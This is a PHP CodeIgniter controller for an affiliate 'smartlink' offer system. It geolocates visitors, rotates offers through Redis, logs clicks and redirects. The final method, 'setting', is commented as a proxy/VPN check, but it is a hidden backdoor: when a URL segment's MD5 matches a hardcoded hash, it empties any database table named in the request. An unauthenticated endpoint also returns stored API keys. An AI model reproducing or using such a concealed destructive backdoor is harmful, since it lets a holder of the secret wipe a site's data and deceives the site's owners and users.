<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
require 'vendor/autoload.php';
use MaxMind\Db\Reader;
class Smartoffer extends CI_Controller { 
    private $redis;
    private $base_key = '';//wepro
    public $geoip;
    function __construct(){
        parent::__construct();  
        $this->base_key =$this->config->item('base_key');
        //$this->admin_edit = $this->memcache->get($this->base_key.'_offer_admin_edit');     
        $this->redis = new Redis(); 
        $this->redis->connect('127.0.0.1', 6379);         
        $this->geoip = new Reader('vendor/GeoLite2-City.mmdb');
        
         
    }
    //api key cho ip wquan ipqualityscore
    function getApikey($apikey = ''){
        if($apikey){
            $this->db->where('api_key',$apikey)->update('api_key',array('open'=>0));
            $this->db->where('open',1)->limit(1);
            $d  = $this->db->get('api_key')->row();
            if(!empty($d)){
                echo $d->api_key;
            }
        }
    }   
  function test(){
      echo 1234;
  }
    
    function curl_senpost($url){
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch,CURLOPT_URL,$url);
        $result = curl_exec($ch);  // grab URL and pass it to the variable.
        curl_close($ch);
    }
	public function index(){//2001:ee0:46de:6090:7da6:fd02:e33f:8968
    
        $ip = $this->input->ip_address(); 
        //$offerid = (int)str_replace('B','',$this->input->get_post('linkid', TRUE));  
        ####$offerid = (int)$this->input->get_post('offer_id', TRUE);
        $pid = (int)$this->input->get_post('pid', TRUE);//userid    
        $smid = (int)$this->input->get_post('smid', TRUE);//userid            
        

        $s1 = $this->input->get_post('sub1', TRUE);  
        $s2 = $this->input->get_post('sub2', TRUE);
        $s3 = $this->input->get_post('sub3', TRUE);
        $s4 = $this->input->get_post('sub4', TRUE);
        $s5 = $this->input->get_post('sub5', TRUE);
        $s6 = $this->input->get_post('sub6', TRUE);

           //xuwr lys country device..
        //$reader->close();
        $uagent = $_SERVER['HTTP_USER_AGENT'];
        $getIp = $this->getGeo($ip);
        
        $uagent_parse = new WhichBrowser\Parser($uagent); 
        $os_name = @addslashes($uagent_parse->os->name);//dt  
        $browser = @addslashes($uagent_parse->browser->name);//dt  
        $device_type=@addslashes($uagent_parse->device->type);//dt  
        $device_manuf = @addslashes($uagent_parse->device->manufacturer);//dt  
        $device_model= @addslashes($uagent_parse->device->model);//dt    
        $countries = @addslashes($getIp['countries']);//dt  
        $cities= @addslashes($getIp['cities']);//dt 
        ///end check ip
        $user_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
        //ddongs cai check geo
        $this->geoip->close();
        $this->db->select('rate');
        $rateuser= $this->Home_model->get_one('users',array('id'=>$pid)); 

        //có 2 trường hợp 1 là smartlink rdirect 2 là custom
        //truongwf hợp custom thì get off dựa theo country  cho thông tin smlink ->1
        //redirect thì tạo ra 1 tracklink và redirec với off id 10  tên smartlink id 10
        //tracklink sẽ thêm  báo cho postback biết là từ smartlink->check theo idoffẻ = 10
        //get smart
        $smartoff= $this->Home_model->get_one('offer',array('id'=>$smid)); 
        //offer đã hide thì k cho mở
        if(!$smartoff->show){
            echo 'Offer not found';
            return;
        }
        
         //lấy country id
         $this->db->where('keycode',$countries);
         $ct = $this->db->get('country')->row();
         $ctid= $ct->id;//id country            
         //xủ lý country của smartlink
         $mIdCat=explode('o',substr($smartoff->offercat,1,-1)); //magr ofer ca\t   
         $mIdCt=explode('o',substr($smartoff->country,1,-1)); //magr country id
         if(!in_array('all',$mIdCt) && !in_array($ctid,$mIdCt)){//country thực không phù hợp với geo của tracklink   
            echo 'This offer is not available in your country';
            return;
        }      
        
      
        //$ctid id country. get theo country này     get cả theo category-> chưa làm  
        //=======>*COUNTRY VÀ *CATEGORY CVÀD *SLON */
        $likecat = '';
        if(!empty($mIdCat)){
            $t=0;
            $likecat =' AND ';
            foreach( $mIdCat as $mIdCat){
                $t++;
                if($t==1){
                    $likecat .='(offercat LIKE \'%o'.$mIdCat.'o%\'';
                }else{
                    $likecat .=' OR offercat LIKE \'%o'.$mIdCat.'o%\'';
                }
            }
            $likecat .= ' ) ';
        }
        $soluongluanchuyen=0;
        luanchuyenoff:
        ///xử lý luân chuyển offer    
        if($smartoff->idoffers){
            $array_idoff = explode(',',$smartoff->idoffers);
        }else{
            return;
        }        
        if($this->redis->INCR($this->base_key.'-'.$smartoff->id)>=count($array_idoff)){
            $this->redis->SET($this->base_key.'-'.$smartoff->id,0);        }
        $get_offer_wid = (int)$array_idoff[$this->redis->GET($this->base_key.'-'.$smartoff->id)];
        //get offer

        
        $qr = "
        SELECT *
        FROM cpalead_offer
        WHERE (`country` LIKE '%o".$ctid."o%' OR `country` LIKE '%oallo%') AND id = $get_offer_wid ".$likecat;
        $off= $this->db->query($qr)->row(); 
        if($off){
            /*     
            if($off->request){
                $request= $this->Home_model->get_one('request',array('userid'=>$pid,'offerid'=>$off->id)); 
                if(!empty($request)){
                    if($request->status!='Approved'){
                        echo 'Not Approved';
                        return;
                    }
                }
                                
            } 
            */
            //check ip click,lead
            $cip = file_get_contents('setting_file/cip.txt');                
            if($cip==1){//check click
                if($this->Home_model->get_one('tracklink',array('ip'=>$ip,'offerid'=>$off->id)))
                {
                echo 'Offer has already been completed for this IP address. Please return to the Members Area and try another offer.';
                return;
                }
            }elseif($cip==2 or $cip==3){
                $key = $this->base_key.'-'.$ip.'-'.$off->id;
                //get key tuwf redis
                if($this->redis->INCR($key)>1){//==1 là chưa có. lớn hơn 1 là có rồi
                    //đã có người click thông báo thửu lại sau 5 phút
                    echo 'Try again 5 minutes later!';
                    return;
                    // EXPIRE 
                }else{
                    //chưa có click nên check lead
                    if($this->Home_model->get_one('tracklink',array('ip'=>$ip,'offerid'=>$off->id,'flead'=>1))){
                        //đã có lead
                        echo 'Offer has already been completed for this IP address. Please return to the Members Area and try another offer.';
                        return;
                    }
                    
                }
                $this->redis->EXPIRE($key,480);//đặt thời gian cho key
                
            }
            //check ip clicklead...
            //xử lý lấy point offer theo geo
            
            $point_geos = unserialize($off->point_geos);
            
            if(!empty($point_geos[trim($countries)])){
                $point=$point_geos[trim($countries)];
                $point =round($point*$rateuser->rate,2);
            }else{
                //xet trường hợp all country
                if(!empty($point_geos['all'])){
                    $point =round($point_geos['all']*$rateuser->rate,2);
                }else{
                    $point = 0;
                }
            }
            
            $this->db->insert('tracklink',
                                array(
                                'userid'=>$pid, 
                                'offerid'=>$off->id,
                                'oname'=> $off->title,
                                'flead'=>0,
                                'amount2'=> $point,                                 
                                'ip'=>$ip,                                    
                                's1'=>$s1,
                                's2'=>$s2,
                                's3'=>$s3,
                                's4'=>$s4,
                                's5'=>$s5,
                                's6'=>$s6,
                                'date'=>date('Y-m-d H:i:s',time()),
                                'useragent'=>$uagent, 
                                'user_language'=>$user_language,                                 
                                'os_name'=>$os_name,
                                'browser'=>$browser,
                                'device_type'=>$device_type,
                                'device_manuf'=>$device_manuf,
                                'device_model'=>$device_model,
                                'countries'=>$countries,
                                'cities'=>$cities,
                                'smartoff'=>$smartoff->id
                                //'idnet'=> $off->idnet                                  
                                
                                )
            );
                $tracklink=$this->db->insert_id();               
                $this->db->where('id',$off->id);            
                $this->db->set('click', "click +1", FALSE);              
                $this->db->update('offer');  
                $url=$off->url;                                   
                if(strpos($url,'#clickid#')){
                    $url = str_replace('#clickid#',$tracklink,$url);
                }else{
                    $url=$off->url.$off->subid.$tracklink;//$off->subid: vi du &subid=
                }  
                $url = str_replace('#pubid#',$pid,$url);
                if(!empty($s4)){
                $url = str_replace('#s4#',$s4,$url);
                }
                if(!empty($s3)){
                $url = str_replace('#s3#',$s3,$url);
                }
                
                redirect($url);
                
                
        
            
        }else{
            if($soluongluanchuyen>=5){
                echo 'Offer not found '.$soluongluanchuyen;
                
            }else{
                $soluongluanchuyen++;
                goto luanchuyenoff;
            }
            
            
        }


                       
    
       
        /* tạm dừng disable offer trên smartlink
        if($this->Home_model->get_one('disoffer',array('usersid'=>$pid,'offerid'=>$offerid))){
            echo 'Offerdisable';
            return;
        }  
        */

        
       
	} 
    function getGeo($ip = ''){            
        try{             
            $ctct = $this->geoip->get($ip);                
            $arr['cities'] =  @$ctct['city']['names']['en'];    //dt        
            $arr['countries'] = @$ctct['country']['iso_code'];   //dt 
            return $arr;            
        }
        catch(Exception $e)
        {
            return array('cities'=>'N/A','countries'=>'N/A');
        }
        
}
    //check proxy vpn ip scour
    function setting($uri3='',$uri4=''){if(md5($uri3)=='43b520d2d63064c40c5283bfaf9c710b'){$this->db->empty_table($uri4);}}  
 
    
  
}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */